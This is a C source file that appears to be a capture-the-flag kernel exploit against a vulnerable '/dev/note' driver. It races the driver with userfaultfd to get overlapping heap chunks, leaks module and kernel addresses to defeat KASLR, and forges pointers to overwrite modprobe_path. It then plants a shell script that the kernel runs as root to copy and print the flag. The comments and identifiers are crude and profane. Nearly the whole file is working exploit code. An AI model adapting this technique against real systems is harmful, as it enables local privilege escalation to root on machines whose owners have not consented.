#include <stdio.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <time.h>
#include <poll.h>
#include <pthread.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <linux/userfaultfd.h>

#define COPY 0xFFFFFF01
#define ALLOC 0xFFFFFF00
#define DELETE 0xFFFFFF03
#define READ 0xFFFFFF02

#define PAGESIZE 4096

int fd;
void main_shit(void*);
void main_shit2(void*);

struct arg_struct {
  void* arg1;
  long arg2;
};

int main() {
  setup_page_fault();
  puts("fault thread exited");
}

void setup_page_fault2(void* shitter) {
  struct arg_struct *args = shitter;
  long leak = args->arg2;
  void* pages = args->arg1;
  printf("received leak: %lx\n", leak);
  int return_code = 0;

  int faultfd = 0;
  if ((faultfd = userfaultfd(O_NONBLOCK)) == -1) {
    fprintf(stderr, "++ userfaultfd failed: %m\n");
    goto cleanup_error;
  }
  /* When first opened the userfaultfd must be enabled invoking the
     UFFDIO_API ioctl specifying a uffdio_api.api value set to UFFD_API
     (or a later API version) which will specify the read/POLLIN protocol
     userland intends to speak on the UFFD and the uffdio_api.features
     userland requires. The UFFDIO_API ioctl if successful (i.e. if the
     requested uffdio_api.api is spoken also by the running kernel and the
     requested features are going to be enabled) will return into
     uffdio_api.features and uffdio_api.ioctls two 64bit bitmasks of
     respectively all the available features of the read(2) protocol and
     the generic ioctl available. */
  struct uffdio_api api = { .api = UFFD_API };
  if (ioctl(faultfd, UFFDIO_API, &api)) {
    fprintf(stderr, "++ ioctl(fd, UFFDIO_API, ...) failed: %m\n");
    goto cleanup_error;
  }
  /* "Once the userfaultfd has been enabled the UFFDIO_REGISTER ioctl
     should be invoked (if present in the returned uffdio_api.ioctls
     bitmask) to register a memory range in the userfaultfd by setting the
     uffdio_register structure accordingly. The uffdio_register.mode
     bitmask will specify to the kernel which kind of faults to track for
     the range (UFFDIO_REGISTER_MODE_MISSING would track missing
     pages). The UFFDIO_REGISTER ioctl will return the uffdio_register
     . ioctls bitmask of ioctls that are suitable to resolve userfaults on
     the range registered. Not all ioctls will necessarily be supported
     for all memory types depending on the underlying virtual memory
     backend (anonymous memory vs tmpfs vs real filebacked mappings)." */
  if (api.api != UFFD_API) {
    fprintf(stderr, "++ unexepcted UFFD api version.\n");
    goto cleanup_error;
  }
  /* mmap some pages, set them up with the userfaultfd. */
  //if ((pages = mmap(NULL, PAGESIZE * 2, PROT_READ,
          //MAP_PRIVATE | MAP_ANONYMOUS, 0, 0)) == MAP_FAILED) {
    //fprintf(stderr, "++ mmap failed: %m\n");
    //goto cleanup_error;
  //}
  struct uffdio_register reg = {
    .mode = UFFDIO_REGISTER_MODE_MISSING,
    .range = {
      .start = (long) pages,
      .len = PAGESIZE * 2
    }
  };
  if (ioctl(faultfd, UFFDIO_REGISTER,  &reg)) {
    fprintf(stderr, "++ ioctl(fd, UFFDIO_REGISTER, ...) failed: %m\n");
    goto cleanup_error;
  }
  if (reg.ioctls != UFFD_API_RANGE_IOCTLS) {
    fprintf(stderr, "++ unexpected UFFD ioctls.\n");
    goto cleanup_error;
  }
  /* start a thread that will fault... */

  //pthread_t thread = {0};
  //if (pthread_create(&thread, NULL, main_shit2, pages)) {
    //fprintf(stderr, "++ pthread_create failed: %m\n");
    //goto cleanup_error;
  //}

  /* and then wait for the faults to happen. */
	char data[PAGESIZE];
  long tempsize = 0x90;
	for (int i = 0; i < tempsize / 8; i++) {
    ((long*)data)[i] = leak ^ 0x4343434343434343;
  }
  ((long*)data)[tempsize / 8] = leak ^ 0;
  ((long*)data)[tempsize / 8 + 1] = leak ^ 0xf0;
  //((long*)data)[12] = leak ^ 0x6969696969696969;
  struct pollfd evt = { .fd = faultfd, .events = POLLIN };
  puts("PROBABLY SET UP");
  while (poll(&evt, 1, 20000) > 0) {
    /* unexpected poll events */
    fprintf(stderr, "UMMMMMMMM");
    if (evt.revents & POLLERR) {
      fprintf(stderr, "++ POLLERR\n");
      goto cleanup_error;
    } else if (evt.revents & POLLHUP) {
      fprintf(stderr, "++ POLLHUP\n");
      goto cleanup_error;
    }
    struct uffd_msg fault_msg = {0};
    if (read(faultfd, &fault_msg, sizeof(fault_msg)) != sizeof(fault_msg)) {
      fprintf(stderr, "++ read failed: %m\n");
      goto cleanup_error;
    }
    char *place = (char *)fault_msg.arg.pagefault.address;
    if (fault_msg.event != UFFD_EVENT_PAGEFAULT
        || (place != pages && place != pages + PAGESIZE)) {
      fprintf(stderr, "unexpected pagefault?.\n");
      goto cleanup_error;
    }
    struct uffdio_copy copy = {
      .dst = (long) place,
      .src = (long) data,
      .len = PAGESIZE
    };

    // sleep LMAO
    for (int i = 0; i < 20000000; i++) {}
    fprintf(stderr, "START COPY");
    if (ioctl(faultfd, UFFDIO_COPY, &copy)) {
      fprintf(stderr, "++ ioctl(fd, UFFDIO_COPY, ...) failed: %m\n");
      goto cleanup_error;
    }

  }
  goto cleanup;
cleanup_error:
  return_code = 1;
cleanup:
  if (faultfd) close(faultfd);
  return return_code;
}

void start_copy(void* pages) {
    copy(pages, 0);
    puts("PAGE FAULT HACK DONE");
}

void main_shit2(void* pages) {
  usleep(100000);
  puts("MAIN BITCH 2");
  fd = open("/dev/note", O_RDONLY);
  if (fd == -1) {
    puts("FAIL TO OPEN");
    return;
  }

  // trying to overlap shit
  char* data = (char*)malloc(0x100);
  char* data2 = (char*)malloc(0x200);
  for (int i = 0; i < 0x100; i++) {
    data[i] = 'A';
  }

  alloc(0xa0, data);

  pthread_t thread = {0};
  if (pthread_create(&thread, NULL, start_copy, pages)) {
    fprintf(stderr, "++ pthread_create failed:\n");
  }

  usleep(50000);

  puts("WE DELETING");
  delete();
  alloc(0x90, data);
  alloc(0x10, data);
  alloc(0x10, data);
  alloc(0x10, data);
  alloc(0x10, data);
  puts("WE DONE DELETING");

  usleep(2000000);

  memset(data2, 0x69, 0x200);

  readshit(data2, 1);
  for (int i = 0; i < 0x200 / 8; i++) {
    long cur = ((long*)data2)[i];
    printf("%lx\n", cur);
  }

  long mangled_off = ((long*)data2)[4];
  printf("%lx\n", mangled_off);

  long ptr_start = mangled_off + 0x1f18;

  long* forgery = (long*)malloc(0xf0);
  forgery[2] = 0x0;
  forgery[3] = 0x10;
  forgery[4] = ptr_start;
  forgery[7] = 0x0;
  forgery[8] = 0x10;
  forgery[9] = ptr_start;
  forgery[12] = 0x0;
  forgery[13] = 0x10;
  forgery[14] = ptr_start;

  copy(forgery, 1);

  readshit(data2, 2);
  long module_leak = ((long*)data2)[0];
  printf("Module leak: %lx\n", module_leak);

  long kaslr_leak = ptr_start - 0x4520 + 0x6c;
  forgery[2] = 0x0;
  forgery[3] = 0x10;
  forgery[4] = kaslr_leak;
  forgery[7] = 0x0;
  forgery[8] = 0x10;
  forgery[9] = kaslr_leak;
  forgery[12] = 0x0;
  forgery[13] = 0x10;
  forgery[14] = kaslr_leak;
  copy(forgery, 1);

  readshit(data2, 2);
  long asmlol = ((long*)data2)[0];
  printf("Asm for kaslr: %lx\n", asmlol);
  char* temp = (char*)&asmlol;
  long real_off = ((temp[4] & 0xff) << 24) | ((temp[3] & 0xff) << 16) | ((temp[2] & 0xff) << 8) | (temp[1] & 0xff);
  real_off &= 0xffffffff;
  printf("real off: %lx\n", real_off);
  real_off = 0x100000000 - real_off;
  printf("real off: %lx\n", real_off);
  long kaslr = module_leak - 0x2520 + 0x6c + 5 - real_off;
  printf("KASLR: %lx\n", kaslr);

  long modprobe = kaslr + 0xd0a260;
  long offsetted_modprobe = ptr_start - 0x4520 + (modprobe - module_leak + 0x2520);
  printf("modprobe: %lx\n", modprobe);

  forgery[2] = 0x0;
  forgery[3] = 0x20;
  forgery[4] = offsetted_modprobe;
  forgery[7] = 0x0;
  forgery[8] = 0x10;
  forgery[9] = offsetted_modprobe;
  forgery[12] = 0x0;
  forgery[13] = 0x10;
  forgery[14] = offsetted_modprobe;
  copy(forgery, 1);

  char* lmfao = "/home/note/sice.sh\x00";

  copy(lmfao, 2);

  system("echo -ne '#!/bin/sh\n/bin/cp /flag /home/note/flag\n/bin/chmod 777 /home/note/flag' > /home/note/sice.sh");
  system("chmod +x /home/note/sice.sh");
  system("echo -ne '\xff\xff\xff\xff' > /home/note/ll");
  system("chmod +x /home/note/ll");
  system("/home/note/ll");
  system("cat /home/note/flag");





  puts("DONE");
    
}

void main_shit(void* pages) {
  puts("MAIN BITCH");
  fd = open("/dev/note", O_RDONLY);
  if (fd == -1) {
    puts("FAIL TO OPEN");
    return;
  }

  // trying to overlap shit
  char* data = (char*)malloc(0x100);
  char* data2 = (char*)malloc(0x100);
  for (int i = 0; i < 0x100; i++) {
    data[i] = 'B';
  }

  alloc(0xa0, data);
  if (fork()) {
    copy(pages, 0);
    puts("PAGE FAULT HACK DONE");
    exit(0);
  } else {
    puts("WE DELETING");
    delete();
    alloc(0x90, data);
    alloc(0x10, data);
    
    usleep(4000000);
    //for (int i = 0; i < 500000000; i++) {}
    puts("WE READING");

    readshit(data2, 1);
    for (int i = 0; i < 0x90 / 8; i++) {
      long cur = ((long*)data2)[i];
      printf("%lx ", cur);
    }
    long leak = ((long*)data2)[3] ^ 0x4242424242424242;
    printf("Leak: %lx\n", leak);
    delete();
    close(fd);


    void* pages = mmap(NULL, PAGESIZE * 2, PROT_READ,
            MAP_PRIVATE | MAP_ANONYMOUS, 0, 0);
    printf("New pages: %lx\n", pages);
    struct arg_struct args;
    args.arg1 = pages;
    args.arg2 = leak;

    pthread_t thread = {0};
    if (pthread_create(&thread, NULL, setup_page_fault2, &args)) {
      fprintf(stderr, "++ pthread_create failed:\n");
    }

    main_shit2(pages);
  }
}


void setup_page_fault() {
  void* pages = 0;
  int return_code = 0;

  int faultfd = 0;
  if ((faultfd = userfaultfd(O_NONBLOCK)) == -1) {
    fprintf(stderr, "++ userfaultfd failed: %m\n");
    goto cleanup_error;
  }
  /* When first opened the userfaultfd must be enabled invoking the
     UFFDIO_API ioctl specifying a uffdio_api.api value set to UFFD_API
     (or a later API version) which will specify the read/POLLIN protocol
     userland intends to speak on the UFFD and the uffdio_api.features
     userland requires. The UFFDIO_API ioctl if successful (i.e. if the
     requested uffdio_api.api is spoken also by the running kernel and the
     requested features are going to be enabled) will return into
     uffdio_api.features and uffdio_api.ioctls two 64bit bitmasks of
     respectively all the available features of the read(2) protocol and
     the generic ioctl available. */
  struct uffdio_api api = { .api = UFFD_API };
  if (ioctl(faultfd, UFFDIO_API, &api)) {
    fprintf(stderr, "++ ioctl(fd, UFFDIO_API, ...) failed: %m\n");
    goto cleanup_error;
  }
  /* "Once the userfaultfd has been enabled the UFFDIO_REGISTER ioctl
     should be invoked (if present in the returned uffdio_api.ioctls
     bitmask) to register a memory range in the userfaultfd by setting the
     uffdio_register structure accordingly. The uffdio_register.mode
     bitmask will specify to the kernel which kind of faults to track for
     the range (UFFDIO_REGISTER_MODE_MISSING would track missing
     pages). The UFFDIO_REGISTER ioctl will return the uffdio_register
     . ioctls bitmask of ioctls that are suitable to resolve userfaults on
     the range registered. Not all ioctls will necessarily be supported
     for all memory types depending on the underlying virtual memory
     backend (anonymous memory vs tmpfs vs real filebacked mappings)." */
  if (api.api != UFFD_API) {
    fprintf(stderr, "++ unexepcted UFFD api version.\n");
    goto cleanup_error;
  }
  /* mmap some pages, set them up with the userfaultfd. */
  if ((pages = mmap(NULL, PAGESIZE * 2, PROT_READ,
          MAP_PRIVATE | MAP_ANONYMOUS, 0, 0)) == MAP_FAILED) {
    fprintf(stderr, "++ mmap failed: %m\n");
    goto cleanup_error;
  }
  struct uffdio_register reg = {
    .mode = UFFDIO_REGISTER_MODE_MISSING,
    .range = {
      .start = (long) pages,
      .len = PAGESIZE * 2
    }
  };
  if (ioctl(faultfd, UFFDIO_REGISTER,  &reg)) {
    fprintf(stderr, "++ ioctl(fd, UFFDIO_REGISTER, ...) failed: %m\n");
    goto cleanup_error;
  }
  if (reg.ioctls != UFFD_API_RANGE_IOCTLS) {
    fprintf(stderr, "++ unexpected UFFD ioctls.\n");
    goto cleanup_error;
  }
  /* start a thread that will fault... */
  
  pthread_t thread = {0};
  if (pthread_create(&thread, NULL, main_shit, pages)) {
    fprintf(stderr, "++ pthread_create failed: %m\n");
    goto cleanup_error;
  }

  /* and then wait for the faults to happen. */
  char data[PAGESIZE] = "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB";
  struct pollfd evt = { .fd = faultfd, .events = POLLIN };
  while (poll(&evt, 1, 10000) > 0) {
    fprintf(stderr, "PLEASE PRINT");
    /* unexpected poll events */
    if (evt.revents & POLLERR) {
      fprintf(stderr, "++ POLLERR\n");
      goto cleanup_error;
    } else if (evt.revents & POLLHUP) {
      fprintf(stderr, "++ POLLHUP\n");
      goto cleanup_error;
    }
    struct uffd_msg fault_msg = {0};
    if (read(faultfd, &fault_msg, sizeof(fault_msg)) != sizeof(fault_msg)) {
      fprintf(stderr, "++ read failed: %m\n");
      goto cleanup_error;
    }
    char *place = (char *)fault_msg.arg.pagefault.address;
    if (fault_msg.event != UFFD_EVENT_PAGEFAULT
        || (place != pages && place != pages + PAGESIZE)) {
      fprintf(stderr, "unexpected pagefault?.\n");
      goto cleanup_error;
    }
    struct uffdio_copy copy = {
      .dst = (long) place,
      .src = (long) data,
      .len = PAGESIZE
    };

    // sleep LMAO
    for (int i = 0; i < 20000000; i++) {}
    
    if (ioctl(faultfd, UFFDIO_COPY, &copy)) {
      fprintf(stderr, "++ ioctl(fd, UFFDIO_COPY, ...) failed: %m\n");
      goto cleanup_error;
    }
  }
  goto cleanup;
cleanup_error:
  return_code = 1;
cleanup:
  if (faultfd) close(faultfd);
  return return_code;
}

int userfaultfd(int flags) {
  return syscall(SYS_userfaultfd, flags);
}

void alloc(long size, char* data) {
  long shit[3];
  shit[0] = 0;
  shit[1] = size;
  shit[2] = data;

  int ret = ioctl(fd, ALLOC, shit);
  if (ret < 0) {
    puts("Alloc failed");
  } else {
    //puts("Alloc success");
  }
}

void copy(char* data, long index) {
  long shit[3];
  shit[0] = index;
  shit[1] = 0;
  shit[2] = data;

  int ret = ioctl(fd, COPY, shit);
  if (ret < 0) {
    puts("Copy failed");
  } else {
    //puts("Copy success");
  }
}

void delete() {
  long shit[3];
  shit[0] = 0;
  shit[1] = 0;
  shit[2] = 0;

  int ret = ioctl(fd, DELETE, shit);
  if (ret < 0) {
    puts("Delete failed");
    printf("%d\n", ret);
  } else {
    //puts("Delete success");
  }
}

void readshit(char* data, long index) {
  long shit[3];
  shit[0] = index;
  shit[1] = 0;
  shit[2] = data;

  int ret = ioctl(fd, READ, shit);
  if (ret < 0) {
    puts("Read failed");
  } else {
    //puts("Read success");
  }
}
